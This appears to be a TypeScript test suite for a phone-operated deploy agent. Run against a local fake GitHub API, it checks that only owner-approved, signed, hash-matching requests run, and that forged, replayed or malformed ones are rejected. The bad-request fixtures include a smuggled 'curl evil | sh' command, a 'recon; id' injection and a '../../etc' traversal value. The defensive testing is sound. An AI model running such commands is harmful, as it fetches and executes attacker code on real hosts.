/**
 * ==========================================================
 * LÉLU — THE PHONE-OPERATED DEPLOY AGENT RUNS ONLY WHAT THE OWNER APPROVED
 *
 * CATEGORY: offline. deploy/contabo/deploy-identity/pull.py runs for real
 * (python3), against a local fake of the GitHub API and raw endpoints. Only
 * the endpoint constants, state paths and the runner are substituted in a
 * temporary copy; the production file has no test hooks.
 *
 * Accepted: a GitHub-signed web-flow merge, on the pinned branch, of a PR
 * from this repo merged BY the owner, carrying the approval label applied BY
 * the owner before the merge, with a valid, fresh, allow-listed request and
 * hash-matching artifacts. Everything else is REJECTED, audited, and never
 * reaches the runner: forgery, replay, unauthorized commits, malformed
 * requests and artifact substitution.
 * ==========================================================
 */
import assert from "node:assert/strict";
import test from "node:test";
import http from "node:http";
import { createHash } from "node:crypto";
import { execFile, spawnSync } from "node:child_process";
import { promisify } from "node:util";
import { mkdtempSync, readFileSync, writeFileSync, existsSync, rmSync, mkdirSync, chmodSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AddressInfo } from "node:net";

const REPO = "lapheezy/LeluV1.1";
const BRANCH = "integration/lelu-four-workforce-consolidation";
const REQUEST_PATH = "deploy/contabo/deploy-request.json";
const PATCH_PATH = "deploy/contabo/patches/voice-tts-moss.patch";
const PATCH = "diff --git a/plugins/voiceApi.ts b/plugins/voiceApi.ts\n";
const sha256 = (s: string) => createHash("sha256").update(s).digest("hex");
const iso = (ms: number) => new Date(ms).toISOString().replace(/\.\d{3}Z$/, "Z");
const HOUR = 3_600_000;

const pythonOk = spawnSync("python3", ["--version"]).status === 0;

interface Fixture {
  sha: string;
  verified: boolean;
  reason: string;
  committer: string;
  onBranch: boolean;
  pulls: Array<{ number: number; merge_commit_sha: string }>;
  pr: Record<string, unknown>;
  events: Array<Record<string, unknown>>;
  files: Record<string, string>;
}

function valid(over: Partial<Fixture> & { request?: Record<string, unknown> } = {}): Fixture {
  const sha = over.sha ?? "a".repeat(40);
  const mergedAt = Date.now() - 60_000;
  const request = {
    schema: 1,
    request_id: "deploy-voice-0001",
    action: "apply",
    repository: REPO,
    branch: BRANCH,
    not_after: iso(Date.now() + 2 * HOUR),
    artifacts: { patch: { path: PATCH_PATH, sha256: sha256(PATCH) } },
    ...(over.request ?? {}),
  };
  return {
    sha,
    verified: true,
    reason: "valid",
    committer: "web-flow",
    onBranch: true,
    pulls: [{ number: 42, merge_commit_sha: sha }],
    pr: {
      merged: true,
      merge_commit_sha: sha,
      merged_at: iso(mergedAt),
      merged_by: { login: "pheruel" },
      base: { ref: BRANCH, repo: { full_name: REPO } },
      head: { repo: { full_name: REPO } },
    },
    events: [{ event: "labeled", label: { name: "deploy-approved" }, actor: { login: "pheruel" }, created_at: iso(mergedAt - 120_000) }],
    files: { [REQUEST_PATH]: JSON.stringify(request), [PATCH_PATH]: PATCH },
    ...over,
  };
}

async function harness() {
  let fixture: Fixture = valid();
  let outages = 0;
  const server = http.createServer((req, res) => {
    if (outages > 0 && (req.url ?? "").includes("/pulls")) {
      outages -= 1;
      res.statusCode = 503;
      return res.end('{"message":"Service Unavailable"}');
    }
    const url = decodeURIComponent(req.url ?? "");
    const send = (status: number, body: unknown) => {
      res.statusCode = status;
      res.end(typeof body === "string" ? body : JSON.stringify(body));
    };
    const f = fixture;
    if (url.startsWith(`/api/repos/${REPO}/commits?`)) return send(200, [{ sha: f.sha }]);
    if (url === `/api/repos/${REPO}/commits/${f.sha}`)
      return send(200, { commit: { verification: { verified: f.verified, reason: f.reason }, committer: { date: iso(Date.now() - 60_000) } }, committer: { login: f.committer } });
    if (url === `/api/repos/${REPO}/compare/${f.sha}...${BRANCH}`) return send(200, f.onBranch ? { status: "ahead", behind_by: 0 } : { status: "diverged", behind_by: 3 });
    if (url === `/api/repos/${REPO}/commits/${f.sha}/pulls`) return send(200, f.pulls);
    if (url === `/api/repos/${REPO}/pulls/42`) return send(200, f.pr);
    if (url.startsWith(`/api/repos/${REPO}/issues/42/events`)) return send(200, f.events);
    const raw = url.match(new RegExp(`^/raw/${REPO}/([0-9a-f]{40})/(.+)$`));
    if (raw && raw[1] === f.sha && raw[2] in f.files) return send(200, f.files[raw[2]]);
    return send(404, { message: "Not Found" });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

  const dir = mkdtempSync(join(tmpdir(), "lelu-pull-"));
  const calls = join(dir, "runner-calls.txt");
  const stub = join(dir, "runner.py");
  writeFileSync(stub, `import sys\nopen(${JSON.stringify(calls)}, "a").write(" ".join(sys.argv[1:]) + "\\n")\nprint("PASS  stub ran " + sys.argv[-1])\n`);
  const agent = join(dir, "pull.py");
  const source = readFileSync("deploy/contabo/deploy-identity/pull.py", "utf8")
    .replace('API = "https://api.github.com"', `API = "${base}/api"`)
    .replace('RAW = "https://raw.githubusercontent.com"', `RAW = "${base}/raw"`)
    .replace('STATE_DIR = "/var/lib/lelu-deploy/pull"', `STATE_DIR = ${JSON.stringify(join(dir, "state"))}`)
    .replace('INCOMING = "/var/lib/lelu-deploy/incoming"', `INCOMING = ${JSON.stringify(join(dir, "incoming"))}`)
    .replace('APPROVALS = "/etc/lelu-deploy/approvals"', `APPROVALS = ${JSON.stringify(join(dir, "approvals"))}`)
    .replace("APPROVER_UID = 0", `APPROVER_UID = ${process.getuid ? process.getuid() : 0}`)
    .replace('RUNNER = ["sudo", "-n", "/usr/local/lib/lelu-deploy/run"]', `RUNNER = ["python3", ${JSON.stringify(stub)}]`);
  assert.ok(source.includes(`API = "${base}/api"`) && source.includes(`"python3", ${JSON.stringify(stub)}`) && source.includes(join(dir, "approvals")), "substitutions applied");
  mkdirSync(join(dir, "approvals"), { recursive: true });
  writeFileSync(agent, source);

  return {
    set(next: Fixture) {
      fixture = next;
    },
    outage(count: number) {
      outages = count;
    },
    // Asynchronous on purpose: the fake GitHub runs in THIS process, and a
    // synchronous spawn would block the event loop it answers from.
    async run() {
      // The fake GitHub is local: no proxy may sit in between.
      const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => !/^(https?|all)_proxy$/i.test(k)));
      await promisify(execFile)("python3", ["-I", agent], { timeout: 60_000, env: { ...env, NO_PROXY: "127.0.0.1,localhost", no_proxy: "127.0.0.1,localhost" } });
    },
    calls: () => (existsSync(calls) ? readFileSync(calls, "utf8").trim().split("\n").filter(Boolean) : []),
    audit: () => (existsSync(join(dir, "state", "audit.log")) ? readFileSync(join(dir, "state", "audit.log"), "utf8") : ""),
    incoming: () => (existsSync(join(dir, "incoming", "voice-tts-moss.patch")) ? readFileSync(join(dir, "incoming", "voice-tts-moss.patch"), "utf8") : null),
    pending: () => (existsSync(join(dir, "state", "pending.json")) ? JSON.parse(readFileSync(join(dir, "state", "pending.json"), "utf8")) : null),
    /** What `lelu-deploy-approve <code>` writes, as root, in the Contabo console. */
    approve(code: string, body: string, mode = 0o644) {
      const file = join(dir, "approvals", code);
      writeFileSync(file, body);
      chmodSync(file, mode);
    },
    close() {
      server.close();
      rmSync(dir, { recursive: true, force: true });
    },
  };
}

test("a GitHub-approved request waits for the owner's console approval, then runs exactly once", { skip: !pythonOk }, async () => {
  const h = await harness();
  try {
    h.set(valid());
    await h.run();
    assert.deepEqual(h.calls(), [], "GitHub approval alone must never run anything");
    const pending = h.pending();
    assert.ok(pending && /^[0-9a-f]{8}$/.test(pending.code), "a pending request with an approval code");
    assert.equal(pending.action, "apply");
    assert.match(h.audit(), new RegExp(`AWAITING-CONSOLE-APPROVAL commit=aaaaaaaaaaaa pr=#42 request=deploy-voice-0001 action=apply code=${pending.code}`));
    await h.run();
    assert.equal((h.audit().match(/AWAITING-CONSOLE-APPROVAL/g) ?? []).length, 1, "announced once, not every poll");
    h.approve(pending.code, `commit=${pending.commit}\nrequest=${pending.request_id}\n`);
    await h.run();
    assert.deepEqual(h.calls(), ["apply"]);
    assert.equal(h.incoming(), PATCH);
    assert.match(h.audit(), /ACCEPTED commit=aaaaaaaaaaaa pr=#42 request=deploy-voice-0001 action=apply/);
    assert.match(h.audit(), /FINISHED request=deploy-voice-0001 action=apply exit=0/);
    await h.run();
    assert.deepEqual(h.calls(), ["apply"], "an approved commit runs at most once");
  } finally {
    h.close();
  }
});

const CONSOLE_ATTACKS: Array<[string, (code: string, p: { commit: string; request_id: string }) => [string, string, number]]> = [
  ["approval for a different code", (code, p) => [code.replace(/^./, (c) => (c === "0" ? "1" : "0")), `commit=${p.commit}\nrequest=${p.request_id}\n`, 0o644]],
  ["group-writable approval file", (code, p) => [code, `commit=${p.commit}\nrequest=${p.request_id}\n`, 0o664]],
  ["approval naming a different commit", (code, p) => [code, `commit=${"c".repeat(40)}\nrequest=${p.request_id}\n`, 0o644]],
];
for (const [name, forge] of CONSOLE_ATTACKS) {
  test(`no run: ${name}`, { skip: !pythonOk }, async () => {
    const h = await harness();
    try {
      h.set(valid());
      await h.run();
      const pending = h.pending();
      const [code, body, mode] = forge(pending.code, pending);
      h.approve(code, body, mode);
      await h.run();
      assert.deepEqual(h.calls(), [], "a forged or mismatched approval must not run anything");
    } finally {
      h.close();
    }
  });
}

const ATTACKS: Array<[string, (f: Fixture) => Fixture, RegExp]> = [
  ["unsigned commit (forgery)", (f) => ({ ...f, verified: false, reason: "unsigned" }), /not GitHub-verified/],
  ["signature with a bad reason", (f) => ({ ...f, reason: "bad_email" }), /not GitHub-verified/],
  ["pushed directly, not merged on github.com", (f) => ({ ...f, committer: "lapheezy" }), /not made through github\.com/],
  ["commit not on the deploy branch", (f) => ({ ...f, onBranch: false }), /is not on integration/],
  ["no pull request behind the commit", (f) => ({ ...f, pulls: [] }), /exactly one pull request/],
  ["PR merged by someone else", (f) => ({ ...f, pr: { ...f.pr, merged_by: { login: "mallory" } } }), /merged by 'mallory'/],
  ["PR from a fork", (f) => ({ ...f, pr: { ...f.pr, head: { repo: { full_name: "mallory/LeluV1.1" } } } }), /comes from a fork/],
  ["PR into another branch", (f) => ({ ...f, pr: { ...f.pr, base: { ref: "main", repo: { full_name: REPO } } } }), /does not target/],
  ["no approval label", (f) => ({ ...f, events: [] }), /no 'deploy-approved' label/],
  ["approval label applied by someone else", (f) => ({ ...f, events: [{ ...f.events[0], actor: { login: "mallory" } }] }), /no 'deploy-approved' label/],
  ["approval label applied only after the merge", (f) => ({ ...f, events: [{ ...f.events[0], created_at: iso(Date.now()) }] }), /no 'deploy-approved' label/],
  [
    "approval label removed before the merge",
    (f) => ({ ...f, events: [f.events[0], { event: "unlabeled", label: { name: "deploy-approved" }, actor: { login: "pheruel" }, created_at: iso(Date.now() - 90_000) }] }),
    /no 'deploy-approved' label/,
  ],
];

for (const [name, mutate, reason] of ATTACKS) {
  test(`rejected: ${name}`, { skip: !pythonOk }, async () => {
    const h = await harness();
    try {
      h.set(mutate(valid()));
      await h.run();
      assert.deepEqual(h.calls(), [], "the runner must never be invoked");
      assert.equal(h.incoming(), null, "no artifact is staged");
      assert.match(h.audit(), new RegExp(`REJECTED commit=aaaaaaaaaaaa reason=.*${reason.source}`));
    } finally {
      h.close();
    }
  });
}

const BAD_REQUESTS: Array<[string, Record<string, unknown> | string, RegExp]> = [
  ["action not allow-listed", { action: "shell" }, /is not allow-listed/],
  ["shell metacharacters in the action", { action: "recon; id" }, /is not allow-listed/],
  ["unexpected key (smuggled command)", { command: "curl evil | sh" }, /unexpected keys/],
  ["another repository", { repository: "mallory/LeluV1.1" }, /different repository or branch/],
  ["another branch", { branch: "main" }, /different repository or branch/],
  ["expired", { not_after: iso(Date.now() - HOUR) }, /expired/],
  ["valid for too long", { not_after: iso(Date.now() + 100 * HOUR) }, /more than 72 h/],
  ["bad request id", { request_id: "../../etc" }, /request_id must be/],
  ["artifact path outside the allow-list", { artifacts: { patch: { path: "server.ts", sha256: sha256(PATCH) } } }, /not allow-listed/],
  ["artifact for an action that takes none", { action: "recon" }, /not allowed for action recon/],
  ["apply without a patch", { artifacts: {} }, /apply needs a patch/],
  ["malformed JSON", "{not json", /not valid JSON/],
];

for (const [name, change, reason] of BAD_REQUESTS) {
  test(`rejected request: ${name}`, { skip: !pythonOk }, async () => {
    const h = await harness();
    try {
      const fixture = valid(typeof change === "string" ? {} : { request: change });
      if (typeof change === "string") fixture.files[REQUEST_PATH] = change;
      h.set(fixture);
      await h.run();
      assert.deepEqual(h.calls(), []);
      assert.match(h.audit(), new RegExp(`REJECTED .*${reason.source}`));
    } finally {
      h.close();
    }
  });
}

test("artifact substitution: the file at the approved commit must match the approved hash", { skip: !pythonOk }, async () => {
  const h = await harness();
  try {
    const fixture = valid();
    fixture.files[PATCH_PATH] = PATCH + "+ malicious line\n";
    h.set(fixture);
    await h.run();
    assert.deepEqual(h.calls(), []);
    assert.equal(h.incoming(), null);
    assert.match(h.audit(), /REJECTED .*does not match the approved .*\(substitution\)/);
  } finally {
    h.close();
  }
});

test("replay: a new approved commit reusing a spent request_id is refused", { skip: !pythonOk }, async () => {
  const h = await harness();
  try {
    h.set(valid());
    await h.run();
    const p = h.pending();
    h.approve(p.code, `commit=${p.commit}\nrequest=${p.request_id}\n`);
    await h.run();
    assert.deepEqual(h.calls(), ["apply"]);
    h.set(valid({ sha: "b".repeat(40) }));
    await h.run();
    assert.deepEqual(h.calls(), ["apply"], "the replayed request must not run");
    assert.match(h.audit(), /REJECTED commit=bbbbbbbbbbbb reason=request_id deploy-voice-0001 was already used \(replay\)/);
  } finally {
    h.close();
  }
});

test("a rejected commit is not retried on the next poll", { skip: !pythonOk }, async () => {
  const h = await harness();
  try {
    h.set({ ...valid(), verified: false, reason: "unsigned" });
    await h.run();
    await h.run();
    assert.equal((h.audit().match(/REJECTED/g) ?? []).length, 1);
  } finally {
    h.close();
  }
});

test("a GitHub outage is not a verdict: the approved request still runs once GitHub answers", { skip: !pythonOk }, async () => {
  const h = await harness();
  try {
    h.set(valid());
    h.outage(1);
    await h.run();
    assert.deepEqual(h.calls(), []);
    assert.match(h.audit(), /POLL-FAILED commit=aaaaaaaaaaaa GitHub unavailable \(HTTP 503\)/);
    assert.doesNotMatch(h.audit(), /REJECTED/);
    await h.run();
    const p = h.pending();
    assert.ok(p, "after the outage the request is verified and waits for the console");
    h.approve(p.code, `commit=${p.commit}\nrequest=${p.request_id}\n`);
    await h.run();
    assert.deepEqual(h.calls(), ["apply"]);
  } finally {
    h.close();
  }
});
